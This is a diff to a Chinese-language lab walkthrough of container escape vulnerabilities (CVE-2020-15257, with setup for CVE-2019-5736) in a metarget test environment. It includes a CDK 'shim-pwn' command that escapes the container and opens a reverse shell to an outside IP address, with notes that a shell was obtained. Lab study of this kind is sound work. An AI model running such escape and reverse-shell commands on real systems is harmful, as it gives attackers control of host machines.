@@ -58,8 +58,6 @@ SUCCESS -- HOST FILE CHANGED
 
 
 4.	cve-2020-15257 容器逃逸
-
-
 安装漏洞环境root@VM-8-3-ubuntu:~/metarget# sudo ./metarget cnv install cve-2020-15257
 ![image](https://github.com/user-attachments/assets/d1ced1be-4672-4a6a-ae32-0f5e32bc22e5)
 
@@ -77,22 +75,20 @@ root@VM-8-3-ubuntu:~/metarget# sudo docker exec -it fbf9212c0fe6 /bin/bash
 给执行权限给该cdk
 root@VM-8-3-ubuntu:/# chmod +x cdk_linux_amd64 
 
-
 使用该工具执行漏洞利用。
 root@VM-8-3-ubuntu:/# ./cdk_linux_amd64 run shim-pwn reverse 43.138.22.133 80  
 （可能存在8888端口安全组没打开的情况）使用80端口，即可
 ![image](https://github.com/user-attachments/assets/eb1e8fa1-54d5-4d2c-afdb-894f214a5734)
 
-
 成功获取shell
 ![image](https://github.com/user-attachments/assets/3ef7cb7c-c7ca-4ac2-8cf0-5dd0e1a9670a)
 
-
-
-
 5.	cve-2019-5736 容器逃逸
-
-
+安装环境
+./metarget cnv install cve-2019-5736
+![image](https://github.com/user-attachments/assets/9adbfc34-ce5c-4d0b-b1f4-9b98efcad554)
+查看版本
+![image](https://github.com/user-attachments/assets/cb9180c1-253b-462f-ba88-5db1d21f4158)
 
 
 
